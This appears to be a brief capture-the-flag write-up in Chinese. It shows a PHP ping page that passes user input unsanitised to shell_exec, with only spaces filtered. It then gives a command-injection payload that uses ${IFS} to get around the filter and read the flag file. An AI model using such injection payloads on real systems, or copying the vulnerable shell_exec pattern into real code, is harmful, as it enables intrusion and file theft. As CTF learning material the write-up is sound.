```php
<html>                                                                                                           
    <body>
        <form action="" method="get">
            <input type="text" name='ip' />
            <input type="submit" name="submit" value="提交">
<?php
$res = FALSE;
if (isset($_GET['submit'])){
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/ /", $ip, $m)){
        $cmd = shell_exec( 'ping  -c 4 ' . $ip );
        echo $cmd;
    }
}
?>
        </form>
    </body>
</html>
```

- 这题过滤了空格
  - payload:
    -   用\${IFS}绕过 127.0.0.1;cat${IFS}flag_1630334994276.php